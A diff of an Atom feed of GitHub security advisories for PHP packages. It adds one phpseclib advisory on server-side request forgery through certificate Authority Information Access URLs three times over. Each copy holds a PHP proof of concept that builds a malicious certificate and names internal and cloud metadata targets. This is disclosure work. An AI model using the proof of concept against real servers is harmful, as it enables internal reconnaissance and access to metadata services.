@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-06-16T13:31:47.662Z</updated>
+    <updated>2026-06-16T15:35:53.499Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -12,6 +12,444 @@
     <category term="MODERATE"/>
     <category term="LOW"/>
     <entry>
+        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib: X.509 certificate validation sends attacker-controlled outbound requests (server-side request forgery) via Authority Information Access]]></title>
+        <id>https://github.com/advisories/GHSA-m557-wrgg-6rp4</id>
+        <link href="https://github.com/advisories/GHSA-m557-wrgg-6rp4"/>
+        <updated>2026-06-16T15:03:59.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>When an application validates an untrusted X.509 certificate with phpseclib, <strong>X509::validateSignature()</strong> reads a URL out of that certificate's Authority Information Access (AIA) extension and connects to it. Attacker who supplies certificate fully controls host, port, and path of that connection. URL fetching is enabled by default, and no destination is blocked. An unauthenticated attacker can therefore make a validating server open connections to internal hosts and ports it should never reach, for example loopback <strong>127.0.0.1</strong>, cloud metadata address <strong>169.254.169.254</strong>, and internal-only services. This is a server-side request forgery (SSRF) caused by an insecure default. It is reproducible on current released LTS 3.0.53 and on 4.0 development line.</p>
+<h3 id="details">Details</h3>
+<p>When no already-trusted certificate authority is the issuer of certificate under validation, <strong>validateSignatureCountable()</strong> continues to AIA fetching. Default for <strong>validateSignature()</strong> is <strong>caonly = true</strong>:</p>
+<pre><code>// phpseclib/File/X509.php:1316-1327 (4.0 development line, commit 74ada1a6)
+if (!isset($signingCert)) {
+    if ($caonly) {
+        return $this-&gt;testForIntermediate(true, $count) &amp;&amp; $this-&gt;validateSignature(true);
+    } else {
+        try {
+            $this-&gt;testForSelfSigned();
+            $signingCert = $this;
+        } catch (BadMethodCallException) {
+            return $this-&gt;testForIntermediate(true, $count) &amp;&amp; $this-&gt;validateSignature(true);
+        }
+    }
+}
+</code></pre>
+<p><strong>testForIntermediate()</strong> takes URL straight out of certificate's AIA caIssuers field and fetches it. Value comes directly from certificate content and is never restricted:</p>
+<pre><code>// phpseclib/File/X509.php:1357-1391 (4.0 development line)
+$opts = $this-&gt;getExtension('id-pe-authorityInfoAccess');
+...
+foreach ($opts['extnValue'] as $opt) {
+    if ($opt['accessMethod'] == 'id-ad-caIssuers') {
+        if (isset($opt['accessLocation']['uniformResourceIdentifier'])) {
+            $url = (string) $opt['accessLocation']['uniformResourceIdentifier']; // attacker controlled
+            break;
+        }
+    }
+}
+...
+$cert = static::fetchURL($url); // server-side request forgery
+</code></pre>
+<p><strong>fetchURL()</strong> connects to attacker host and port. There is no destination validation: no block on loopback, link-local, private, or metadata ranges, and no port restriction:</p>
+<pre><code>// phpseclib/File/X509.php:1456-1476 (4.0 development line)
+private static function fetchURL(string $url): ?string
+{
+    if (self::$disable_url_fetch) {  // default false, so fetching happens
+        return null;
+    }
+    $parts = parse_url($url);
+    switch ($parts['scheme']) {
+        case 'http':
+            $fsock = @fsockopen($parts['host'], $parts['port'] ?? 80); // attacker host and port
+            ...
+            fputs($fsock, "GET $path HTTP/1.0\r\n");
+            fputs($fsock, "Host: $parts[host]\r\n\r\n");
+</code></pre>
+<p>Fetching is on by default:</p>
+<pre><code>// phpseclib/File/X509.php:110 (4.0 development line)
+private static bool $disable_url_fetch = false;
+</code></pre>
+<p>Same default-enabled logic exists in released 3.0.x. In 3.0.53 it sits at <strong>$disable_url_fetch = false</strong> on line 255 and <strong>fsockopen($parts['host'], ...)</strong> on line 1136 of <strong>phpseclib/File/X509.php</strong>.</p>
+<p>Why this is a vulnerability and not merely a feature. AIA chasing is a legitimate capability described by RFC 4325, and this report does not claim fetching is wrong in itself. Vulnerability is the combination of three properties that together match definition of SSRF:</p>
+<ol>
+<li>URL comes from untrusted input. It is read out of certificate that an application is trying to validate, which is exactly the data an attacker controls.</li>
+<li>Fetching is enabled by default. An integrator who simply calls <strong>validateSignature()</strong> gets outbound requests with no opt-in. Only control, <strong>X509::disableURLFetch()</strong>, is off by default, so secure behaviour requires knowing about and calling a method that most callers never see.</li>
+<li>No destination is restricted. Loopback, private ranges, link-local metadata, and arbitrary ports are all reachable. Mature implementations of AIA fetching restrict destinations precisely to prevent this.</li>
+</ol>
+<p>Reachability is not narrow. Fetch triggers whenever certificate's issuer is not already trusted, which an attacker arranges trivially by choosing any issuer name that is not in trust store. Having certificate authorities loaded does not protect a target: an attacker certificate that claims an unknown issuer still reaches <strong>testForIntermediate()</strong>.</p>
+<p>Response handling is blind. Fetched body is used only if it parses as a certificate, and is otherwise discarded, so an attacker does not directly read internal responses through this path. That limits confidentiality impact but does not remove request-forgery and reconnaissance capability.</p>
+<h3 id="poc">PoC</h3>
+<p>Two reproductions follow: current released LTS 3.0.53, and 4.0 development line. Malicious certificate is plain PEM and is identical for both, since certificate format is the same across versions.</p>
+<p>Build malicious certificate once (this uses 4.0 to build, but any tool that emits an X.509 certificate with an AIA caIssuers URL works):</p>
+<pre><code>composer require phpseclib/phpseclib:4.0.x-dev
+</code></pre>
+<pre><code class="language-php">&lt;?php
+require 'vendor/autoload.php';
+
+use phpseclib4\Crypt\RSA;
+use phpseclib4\File\X509;
+
+$url = 'http://127.0.0.1:19090/ssrf';
+
+$key  = RSA::createKey(2048)-&gt;withPadding(RSA::SIGNATURE_PKCS1)-&gt;withHash('sha256');
+$cert = new X509($key-&gt;getPublicKey());
+$cert-&gt;addDNProp('id-at-commonName', 'attacker-leaf.example');
+$cert-&gt;setEndDate('lifetime');
+$cert-&gt;setExtension('id-pe-authorityInfoAccess', [
+    ['accessMethod' =&gt; 'id-ad-caIssuers',
+     'accessLocation' =&gt; ['uniformResourceIdentifier' =&gt; $url]],
+]);
+$key-&gt;sign($cert);
+file_put_contents('attacker_cert.pem', (string) $cert);
+</code></pre>
+<p>Stand up a listener that represents an internal service on a port that is not otherwise reachable from outside:</p>
+<pre><code>php -r '$s=stream_socket_server("tcp://127.0.0.1:19090",$e,$m);$c=stream_socket_accept($s,20);echo fread($c,4096);'
+</code></pre>
+<p>Reproduction on released LTS 3.0.53. Install it and have an application validate certificate:</p>
+<pre><code>composer require phpseclib/phpseclib:~3.0.0
+</code></pre>
+<pre><code class="language-php">&lt;?php
+require 'vendor/autoload.php';
+
+use phpseclib3\File\X509;
+
+$v = new X509();
+$v-&gt;loadX509(file_get_contents('attacker_cert.pem'));
+$v-&gt;validateSignature();   // connects to 127.0.0.1:19090 during validation
+</code></pre>
+<p>Reproduction on 4.0 development line. Same certificate, 4.0 namespace:</p>
+<pre><code class="language-php">&lt;?php
+require 'vendor/autoload.php';
+
+use phpseclib4\File\X509;
+
+X509::clearCAStore();      // attacker cert issuer is not trusted
+$v = X509::load(file_get_contents('attacker_cert.pem'));
+$v-&gt;validateSignature();   // connects to 127.0.0.1:19090 during validation
+</code></pre>
+<p>Observed result, on both 3.0.53 and 4.0.x-dev. Listener receives a request whose host, port, and path all come from certificate, even though <strong>validateSignature()</strong> returns false:</p>
+<pre><code>GET /ssrf HTTP/1.0
+Host: 127.0.0.1
+</code></pre>
+<p>This was also confirmed end to end over HTTP: an unauthenticated POST of certificate to an endpoint that calls <strong>loadX509()</strong> then <strong>validateSignature()</strong> makes server connect outbound to attacker-chosen <strong>127.0.0.1:19090</strong>. Changing host and port in certificate reaches any internal address and port, for example <strong>169.254.169.254</strong> or <strong>127.0.0.1:6379</strong>.</p>
+<p>Negative control. With <strong>X509::disableURLFetch()</strong> set before validation, validation returns false and no outbound connection is made. This confirms both root cause and that default-on behaviour is the trigger.</p>
+<h3 id="impact">Impact</h3>
+<p>This is a server-side request forgery (CWE-918) caused by an insecure default (CWE-276): URL fetching is enabled by default and applies no destination restrictions while acting on untrusted certificate content.</p>
+<p>An application is affected when it validates an attacker-influenced certificate, which covers client-certificate checks implemented in PHP, S/MIME and CMS signer verification, document and code-signing validation, and any feature that verifies an uploaded or pasted certificate. No authentication and no user interaction are needed.</p>
+<p>What an attacker gains:</p>
+<ul>
+<li>Internal reconnaissance and port scanning. Connection success or failure and timing reveal which internal hosts and ports respond.</li>
+<li>Interaction with internal-only HTTP services such as admin panels, dashboards, and webhooks bound to loopback or private ranges.</li>
+<li>Requests to cloud metadata endpoints such as <strong>169.254.169.254</strong>, which answer plain HTTP GET on some providers.</li>
+</ul>
+<p>Because fetch is blind, an attacker does not read internal response bodies through this path directly, so this is a request-forgery and reconnaissance primitive rather than direct disclosure of internal data. Any reflective sink elsewhere in an application, or any internal endpoint that performs an action on a GET, increases real impact.</p>
+<p>Suggested fix, strongest first: default <strong>disableURLFetch</strong> to true so AIA chasing is opt-in; if it stays enabled, validate destinations inside <strong>fetchURL()</strong> by rejecting loopback, link-local, and private addresses and restricting ports, and add an egress policy callback similar to existing <strong>setCRLLookupCallback()</strong>; and state plainly in documentation that validating an untrusted certificate can cause outbound requests to URLs found inside that certificate.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/phpseclib/phpseclib/security/advisories/GHSA-m557-wrgg-6rp4">https://github.com/phpseclib/phpseclib/security/advisories/GHSA-m557-wrgg-6rp4</a></li>
+<li><a href="https://github.com/advisories/GHSA-m557-wrgg-6rp4">https://github.com/advisories/GHSA-m557-wrgg-6rp4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m557-wrgg-6rp4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-16T15:03:58.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib: X.509 certificate validation sends attacker-controlled outbound requests (server-side request forgery) via Authority Information Access]]></title>
+        <id>https://github.com/advisories/GHSA-m557-wrgg-6rp4</id>
+        <link href="https://github.com/advisories/GHSA-m557-wrgg-6rp4"/>
+        <updated>2026-06-16T15:03:59.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>When an application validates an untrusted X.509 certificate with phpseclib, <strong>X509::validateSignature()</strong> reads a URL out of that certificate's Authority Information Access (AIA) extension and connects to it. Attacker who supplies certificate fully controls host, port, and path of that connection. URL fetching is enabled by default, and no destination is blocked. An unauthenticated attacker can therefore make a validating server open connections to internal hosts and ports it should never reach, for example loopback <strong>127.0.0.1</strong>, cloud metadata address <strong>169.254.169.254</strong>, and internal-only services. This is a server-side request forgery (SSRF) caused by an insecure default. It is reproducible on current released LTS 3.0.53 and on 4.0 development line.</p>
+<h3 id="details">Details</h3>
+<p>When no already-trusted certificate authority is the issuer of certificate under validation, <strong>validateSignatureCountable()</strong> continues to AIA fetching. Default for <strong>validateSignature()</strong> is <strong>caonly = true</strong>:</p>
+<pre><code>// phpseclib/File/X509.php:1316-1327 (4.0 development line, commit 74ada1a6)
+if (!isset($signingCert)) {
+    if ($caonly) {
+        return $this-&gt;testForIntermediate(true, $count) &amp;&amp; $this-&gt;validateSignature(true);
+    } else {
+        try {
+            $this-&gt;testForSelfSigned();
+            $signingCert = $this;
+        } catch (BadMethodCallException) {
+            return $this-&gt;testForIntermediate(true, $count) &amp;&amp; $this-&gt;validateSignature(true);
+        }
+    }
+}
+</code></pre>
+<p><strong>testForIntermediate()</strong> takes URL straight out of certificate's AIA caIssuers field and fetches it. Value comes directly from certificate content and is never restricted:</p>
+<pre><code>// phpseclib/File/X509.php:1357-1391 (4.0 development line)
+$opts = $this-&gt;getExtension('id-pe-authorityInfoAccess');
+...
+foreach ($opts['extnValue'] as $opt) {
+    if ($opt['accessMethod'] == 'id-ad-caIssuers') {
+        if (isset($opt['accessLocation']['uniformResourceIdentifier'])) {
+            $url = (string) $opt['accessLocation']['uniformResourceIdentifier']; // attacker controlled
+            break;
+        }
+    }
+}
+...
+$cert = static::fetchURL($url); // server-side request forgery
+</code></pre>
+<p><strong>fetchURL()</strong> connects to attacker host and port. There is no destination validation: no block on loopback, link-local, private, or metadata ranges, and no port restriction:</p>
+<pre><code>// phpseclib/File/X509.php:1456-1476 (4.0 development line)
+private static function fetchURL(string $url): ?string
+{
+    if (self::$disable_url_fetch) {  // default false, so fetching happens
+        return null;
+    }
+    $parts = parse_url($url);
+    switch ($parts['scheme']) {
+        case 'http':
+            $fsock = @fsockopen($parts['host'], $parts['port'] ?? 80); // attacker host and port
+            ...
+            fputs($fsock, "GET $path HTTP/1.0\r\n");
+            fputs($fsock, "Host: $parts[host]\r\n\r\n");
+</code></pre>
+<p>Fetching is on by default:</p>
+<pre><code>// phpseclib/File/X509.php:110 (4.0 development line)
+private static bool $disable_url_fetch = false;
+</code></pre>
+<p>Same default-enabled logic exists in released 3.0.x. In 3.0.53 it sits at <strong>$disable_url_fetch = false</strong> on line 255 and <strong>fsockopen($parts['host'], ...)</strong> on line 1136 of <strong>phpseclib/File/X509.php</strong>.</p>
+<p>Why this is a vulnerability and not merely a feature. AIA chasing is a legitimate capability described by RFC 4325, and this report does not claim fetching is wrong in itself. Vulnerability is the combination of three properties that together match definition of SSRF:</p>
+<ol>
+<li>URL comes from untrusted input. It is read out of certificate that an application is trying to validate, which is exactly the data an attacker controls.</li>
+<li>Fetching is enabled by default. An integrator who simply calls <strong>validateSignature()</strong> gets outbound requests with no opt-in. Only control, <strong>X509::disableURLFetch()</strong>, is off by default, so secure behaviour requires knowing about and calling a method that most callers never see.</li>
+<li>No destination is restricted. Loopback, private ranges, link-local metadata, and arbitrary ports are all reachable. Mature implementations of AIA fetching restrict destinations precisely to prevent this.</li>
+</ol>
+<p>Reachability is not narrow. Fetch triggers whenever certificate's issuer is not already trusted, which an attacker arranges trivially by choosing any issuer name that is not in trust store. Having certificate authorities loaded does not protect a target: an attacker certificate that claims an unknown issuer still reaches <strong>testForIntermediate()</strong>.</p>
+<p>Response handling is blind. Fetched body is used only if it parses as a certificate, and is otherwise discarded, so an attacker does not directly read internal responses through this path. That limits confidentiality impact but does not remove request-forgery and reconnaissance capability.</p>
+<h3 id="poc">PoC</h3>
+<p>Two reproductions follow: current released LTS 3.0.53, and 4.0 development line. Malicious certificate is plain PEM and is identical for both, since certificate format is the same across versions.</p>
+<p>Build malicious certificate once (this uses 4.0 to build, but any tool that emits an X.509 certificate with an AIA caIssuers URL works):</p>
+<pre><code>composer require phpseclib/phpseclib:4.0.x-dev
+</code></pre>
+<pre><code class="language-php">&lt;?php
+require 'vendor/autoload.php';
+
+use phpseclib4\Crypt\RSA;
+use phpseclib4\File\X509;
+
+$url = 'http://127.0.0.1:19090/ssrf';
+
+$key  = RSA::createKey(2048)-&gt;withPadding(RSA::SIGNATURE_PKCS1)-&gt;withHash('sha256');
+$cert = new X509($key-&gt;getPublicKey());
+$cert-&gt;addDNProp('id-at-commonName', 'attacker-leaf.example');
+$cert-&gt;setEndDate('lifetime');
+$cert-&gt;setExtension('id-pe-authorityInfoAccess', [
+    ['accessMethod' =&gt; 'id-ad-caIssuers',
+     'accessLocation' =&gt; ['uniformResourceIdentifier' =&gt; $url]],
+]);
+$key-&gt;sign($cert);
+file_put_contents('attacker_cert.pem', (string) $cert);
+</code></pre>
+<p>Stand up a listener that represents an internal service on a port that is not otherwise reachable from outside:</p>
+<pre><code>php -r '$s=stream_socket_server("tcp://127.0.0.1:19090",$e,$m);$c=stream_socket_accept($s,20);echo fread($c,4096);'
+</code></pre>
+<p>Reproduction on released LTS 3.0.53. Install it and have an application validate certificate:</p>
+<pre><code>composer require phpseclib/phpseclib:~3.0.0
+</code></pre>
+<pre><code class="language-php">&lt;?php
+require 'vendor/autoload.php';
+
+use phpseclib3\File\X509;
+
+$v = new X509();
+$v-&gt;loadX509(file_get_contents('attacker_cert.pem'));
+$v-&gt;validateSignature();   // connects to 127.0.0.1:19090 during validation
+</code></pre>
+<p>Reproduction on 4.0 development line. Same certificate, 4.0 namespace:</p>
+<pre><code class="language-php">&lt;?php
+require 'vendor/autoload.php';
+
+use phpseclib4\File\X509;
+
+X509::clearCAStore();      // attacker cert issuer is not trusted
+$v = X509::load(file_get_contents('attacker_cert.pem'));
+$v-&gt;validateSignature();   // connects to 127.0.0.1:19090 during validation
+</code></pre>
+<p>Observed result, on both 3.0.53 and 4.0.x-dev. Listener receives a request whose host, port, and path all come from certificate, even though <strong>validateSignature()</strong> returns false:</p>
+<pre><code>GET /ssrf HTTP/1.0
+Host: 127.0.0.1
+</code></pre>
+<p>This was also confirmed end to end over HTTP: an unauthenticated POST of certificate to an endpoint that calls <strong>loadX509()</strong> then <strong>validateSignature()</strong> makes server connect outbound to attacker-chosen <strong>127.0.0.1:19090</strong>. Changing host and port in certificate reaches any internal address and port, for example <strong>169.254.169.254</strong> or <strong>127.0.0.1:6379</strong>.</p>
+<p>Negative control. With <strong>X509::disableURLFetch()</strong> set before validation, validation returns false and no outbound connection is made. This confirms both root cause and that default-on behaviour is the trigger.</p>
+<h3 id="impact">Impact</h3>
+<p>This is a server-side request forgery (CWE-918) caused by an insecure default (CWE-276): URL fetching is enabled by default and applies no destination restrictions while acting on untrusted certificate content.</p>
+<p>An application is affected when it validates an attacker-influenced certificate, which covers client-certificate checks implemented in PHP, S/MIME and CMS signer verification, document and code-signing validation, and any feature that verifies an uploaded or pasted certificate. No authentication and no user interaction are needed.</p>
+<p>What an attacker gains:</p>
+<ul>
+<li>Internal reconnaissance and port scanning. Connection success or failure and timing reveal which internal hosts and ports respond.</li>
+<li>Interaction with internal-only HTTP services such as admin panels, dashboards, and webhooks bound to loopback or private ranges.</li>
+<li>Requests to cloud metadata endpoints such as <strong>169.254.169.254</strong>, which answer plain HTTP GET on some providers.</li>
+</ul>
+<p>Because fetch is blind, an attacker does not read internal response bodies through this path directly, so this is a request-forgery and reconnaissance primitive rather than direct disclosure of internal data. Any reflective sink elsewhere in an application, or any internal endpoint that performs an action on a GET, increases real impact.</p>
+<p>Suggested fix, strongest first: default <strong>disableURLFetch</strong> to true so AIA chasing is opt-in; if it stays enabled, validate destinations inside <strong>fetchURL()</strong> by rejecting loopback, link-local, and private addresses and restricting ports, and add an egress policy callback similar to existing <strong>setCRLLookupCallback()</strong>; and state plainly in documentation that validating an untrusted certificate can cause outbound requests to URLs found inside that certificate.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/phpseclib/phpseclib/security/advisories/GHSA-m557-wrgg-6rp4">https://github.com/phpseclib/phpseclib/security/advisories/GHSA-m557-wrgg-6rp4</a></li>
+<li><a href="https://github.com/advisories/GHSA-m557-wrgg-6rp4">https://github.com/advisories/GHSA-m557-wrgg-6rp4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m557-wrgg-6rp4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-16T15:03:58.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib: X.509 certificate validation sends attacker-controlled outbound requests (server-side request forgery) via Authority Information Access]]></title>
+        <id>https://github.com/advisories/GHSA-m557-wrgg-6rp4</id>
+        <link href="https://github.com/advisories/GHSA-m557-wrgg-6rp4"/>
+        <updated>2026-06-16T15:03:59.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>When an application validates an untrusted X.509 certificate with phpseclib, <strong>X509::validateSignature()</strong> reads a URL out of that certificate's Authority Information Access (AIA) extension and connects to it. Attacker who supplies certificate fully controls host, port, and path of that connection. URL fetching is enabled by default, and no destination is blocked. An unauthenticated attacker can therefore make a validating server open connections to internal hosts and ports it should never reach, for example loopback <strong>127.0.0.1</strong>, cloud metadata address <strong>169.254.169.254</strong>, and internal-only services. This is a server-side request forgery (SSRF) caused by an insecure default. It is reproducible on current released LTS 3.0.53 and on 4.0 development line.</p>
+<h3 id="details">Details</h3>
+<p>When no already-trusted certificate authority is the issuer of certificate under validation, <strong>validateSignatureCountable()</strong> continues to AIA fetching. Default for <strong>validateSignature()</strong> is <strong>caonly = true</strong>:</p>
+<pre><code>// phpseclib/File/X509.php:1316-1327 (4.0 development line, commit 74ada1a6)
+if (!isset($signingCert)) {
+    if ($caonly) {
+        return $this-&gt;testForIntermediate(true, $count) &amp;&amp; $this-&gt;validateSignature(true);
+    } else {
+        try {
+            $this-&gt;testForSelfSigned();
+            $signingCert = $this;
+        } catch (BadMethodCallException) {
+            return $this-&gt;testForIntermediate(true, $count) &amp;&amp; $this-&gt;validateSignature(true);
+        }
+    }
+}
+</code></pre>
+<p><strong>testForIntermediate()</strong> takes URL straight out of certificate's AIA caIssuers field and fetches it. Value comes directly from certificate content and is never restricted:</p>
+<pre><code>// phpseclib/File/X509.php:1357-1391 (4.0 development line)
+$opts = $this-&gt;getExtension('id-pe-authorityInfoAccess');
+...
+foreach ($opts['extnValue'] as $opt) {
+    if ($opt['accessMethod'] == 'id-ad-caIssuers') {
+        if (isset($opt['accessLocation']['uniformResourceIdentifier'])) {
+            $url = (string) $opt['accessLocation']['uniformResourceIdentifier']; // attacker controlled
+            break;
+        }
+    }
+}
+...
+$cert = static::fetchURL($url); // server-side request forgery
+</code></pre>
+<p><strong>fetchURL()</strong> connects to attacker host and port. There is no destination validation: no block on loopback, link-local, private, or metadata ranges, and no port restriction:</p>
+<pre><code>// phpseclib/File/X509.php:1456-1476 (4.0 development line)
+private static function fetchURL(string $url): ?string
+{
+    if (self::$disable_url_fetch) {  // default false, so fetching happens
+        return null;
+    }
+    $parts = parse_url($url);
+    switch ($parts['scheme']) {
+        case 'http':
+            $fsock = @fsockopen($parts['host'], $parts['port'] ?? 80); // attacker host and port
+            ...
+            fputs($fsock, "GET $path HTTP/1.0\r\n");
+            fputs($fsock, "Host: $parts[host]\r\n\r\n");
+</code></pre>
+<p>Fetching is on by default:</p>
+<pre><code>// phpseclib/File/X509.php:110 (4.0 development line)
+private static bool $disable_url_fetch = false;
+</code></pre>
+<p>Same default-enabled logic exists in released 3.0.x. In 3.0.53 it sits at <strong>$disable_url_fetch = false</strong> on line 255 and <strong>fsockopen($parts['host'], ...)</strong> on line 1136 of <strong>phpseclib/File/X509.php</strong>.</p>
+<p>Why this is a vulnerability and not merely a feature. AIA chasing is a legitimate capability described by RFC 4325, and this report does not claim fetching is wrong in itself. Vulnerability is the combination of three properties that together match definition of SSRF:</p>
+<ol>
+<li>URL comes from untrusted input. It is read out of certificate that an application is trying to validate, which is exactly the data an attacker controls.</li>
+<li>Fetching is enabled by default. An integrator who simply calls <strong>validateSignature()</strong> gets outbound requests with no opt-in. Only control, <strong>X509::disableURLFetch()</strong>, is off by default, so secure behaviour requires knowing about and calling a method that most callers never see.</li>
+<li>No destination is restricted. Loopback, private ranges, link-local metadata, and arbitrary ports are all reachable. Mature implementations of AIA fetching restrict destinations precisely to prevent this.</li>
+</ol>
+<p>Reachability is not narrow. Fetch triggers whenever certificate's issuer is not already trusted, which an attacker arranges trivially by choosing any issuer name that is not in trust store. Having certificate authorities loaded does not protect a target: an attacker certificate that claims an unknown issuer still reaches <strong>testForIntermediate()</strong>.</p>
+<p>Response handling is blind. Fetched body is used only if it parses as a certificate, and is otherwise discarded, so an attacker does not directly read internal responses through this path. That limits confidentiality impact but does not remove request-forgery and reconnaissance capability.</p>
+<h3 id="poc">PoC</h3>
+<p>Two reproductions follow: current released LTS 3.0.53, and 4.0 development line. Malicious certificate is plain PEM and is identical for both, since certificate format is the same across versions.</p>
+<p>Build malicious certificate once (this uses 4.0 to build, but any tool that emits an X.509 certificate with an AIA caIssuers URL works):</p>
+<pre><code>composer require phpseclib/phpseclib:4.0.x-dev
+</code></pre>
+<pre><code class="language-php">&lt;?php
+require 'vendor/autoload.php';
+
+use phpseclib4\Crypt\RSA;
+use phpseclib4\File\X509;
+
+$url = 'http://127.0.0.1:19090/ssrf';
+
+$key  = RSA::createKey(2048)-&gt;withPadding(RSA::SIGNATURE_PKCS1)-&gt;withHash('sha256');
+$cert = new X509($key-&gt;getPublicKey());
+$cert-&gt;addDNProp('id-at-commonName', 'attacker-leaf.example');
+$cert-&gt;setEndDate('lifetime');
+$cert-&gt;setExtension('id-pe-authorityInfoAccess', [
+    ['accessMethod' =&gt; 'id-ad-caIssuers',
+     'accessLocation' =&gt; ['uniformResourceIdentifier' =&gt; $url]],
+]);
+$key-&gt;sign($cert);
+file_put_contents('attacker_cert.pem', (string) $cert);
+</code></pre>
+<p>Stand up a listener that represents an internal service on a port that is not otherwise reachable from outside:</p>
+<pre><code>php -r '$s=stream_socket_server("tcp://127.0.0.1:19090",$e,$m);$c=stream_socket_accept($s,20);echo fread($c,4096);'
+</code></pre>
+<p>Reproduction on released LTS 3.0.53. Install it and have an application validate certificate:</p>
+<pre><code>composer require phpseclib/phpseclib:~3.0.0
+</code></pre>
+<pre><code class="language-php">&lt;?php
+require 'vendor/autoload.php';
+
+use phpseclib3\File\X509;
+
+$v = new X509();
+$v-&gt;loadX509(file_get_contents('attacker_cert.pem'));
+$v-&gt;validateSignature();   // connects to 127.0.0.1:19090 during validation
+</code></pre>
+<p>Reproduction on 4.0 development line. Same certificate, 4.0 namespace:</p>
+<pre><code class="language-php">&lt;?php
+require 'vendor/autoload.php';
+
+use phpseclib4\File\X509;
+
+X509::clearCAStore();      // attacker cert issuer is not trusted
+$v = X509::load(file_get_contents('attacker_cert.pem'));
+$v-&gt;validateSignature();   // connects to 127.0.0.1:19090 during validation
+</code></pre>
+<p>Observed result, on both 3.0.53 and 4.0.x-dev. Listener receives a request whose host, port, and path all come from certificate, even though <strong>validateSignature()</strong> returns false:</p>
+<pre><code>GET /ssrf HTTP/1.0
+Host: 127.0.0.1
+</code></pre>
+<p>This was also confirmed end to end over HTTP: an unauthenticated POST of certificate to an endpoint that calls <strong>loadX509()</strong> then <strong>validateSignature()</strong> makes server connect outbound to attacker-chosen <strong>127.0.0.1:19090</strong>. Changing host and port in certificate reaches any internal address and port, for example <strong>169.254.169.254</strong> or <strong>127.0.0.1:6379</strong>.</p>
+<p>Negative control. With <strong>X509::disableURLFetch()</strong> set before validation, validation returns false and no outbound connection is made. This confirms both root cause and that default-on behaviour is the trigger.</p>
+<h3 id="impact">Impact</h3>
+<p>This is a server-side request forgery (CWE-918) caused by an insecure default (CWE-276): URL fetching is enabled by default and applies no destination restrictions while acting on untrusted certificate content.</p>
+<p>An application is affected when it validates an attacker-influenced certificate, which covers client-certificate checks implemented in PHP, S/MIME and CMS signer verification, document and code-signing validation, and any feature that verifies an uploaded or pasted certificate. No authentication and no user interaction are needed.</p>
+<p>What an attacker gains:</p>
+<ul>
+<li>Internal reconnaissance and port scanning. Connection success or failure and timing reveal which internal hosts and ports respond.</li>
+<li>Interaction with internal-only HTTP services such as admin panels, dashboards, and webhooks bound to loopback or private ranges.</li>
+<li>Requests to cloud metadata endpoints such as <strong>169.254.169.254</strong>, which answer plain HTTP GET on some providers.</li>
+</ul>
+<p>Because fetch is blind, an attacker does not read internal response bodies through this path directly, so this is a request-forgery and reconnaissance primitive rather than direct disclosure of internal data. Any reflective sink elsewhere in an application, or any internal endpoint that performs an action on a GET, increases real impact.</p>
+<p>Suggested fix, strongest first: default <strong>disableURLFetch</strong> to true so AIA chasing is opt-in; if it stays enabled, validate destinations inside <strong>fetchURL()</strong> by rejecting loopback, link-local, and private addresses and restricting ports, and add an egress policy callback similar to existing <strong>setCRLLookupCallback()</strong>; and state plainly in documentation that validating an untrusted certificate can cause outbound requests to URLs found inside that certificate.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/phpseclib/phpseclib/security/advisories/GHSA-m557-wrgg-6rp4">https://github.com/phpseclib/phpseclib/security/advisories/GHSA-m557-wrgg-6rp4</a></li>
+<li><a href="https://github.com/advisories/GHSA-m557-wrgg-6rp4">https://github.com/advisories/GHSA-m557-wrgg-6rp4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m557-wrgg-6rp4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-16T15:03:58.000Z</published>
+    </entry>
+    <entry>
         <title type="html"><![CDATA[[symfony/symfony] Symfony: UrlGenerator Dot-Segment Encoding Skips Every Other Chained `../` or `./` → Generated URL Collapses Off-Route Under RFC 3986 Normalization]]></title>
         <id>https://github.com/advisories/GHSA-h5x3-xfc9-m39h</id>
         <link href="https://github.com/advisories/GHSA-h5x3-xfc9-m39h"/>
@@ -708,105 +1146,5 @@
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-06-15T17:32:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[symfony/mailomat-mailer] Symfony: Mailomat Mailer Webhook Parser Reads the HMAC Algorithm from the Request: Signature Algorithm Downgrade]]></title>
-        <id>https://github.com/advisories/GHSA-rrj9-5q2j-4gvr</id>
-        <link href="https://github.com/advisories/GHSA-rrj9-5q2j-4gvr"/>
-        <updated>2026-06-15T17:32:28.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p><code>Symfony\Component\Mailer\Bridge\Mailomat\Webhook\MailomatRequestParser::validateSignature()</code> parses the <code>X-MOM-Webhook-Signature</code> request header as <code>algo=signature</code> and passes the wire-supplied <code>$algo</code> directly to <code>hash_hmac()</code> when verifying the request against the configured webhook secret. The request therefore selects the HMAC primitive used to authenticate it.</p>
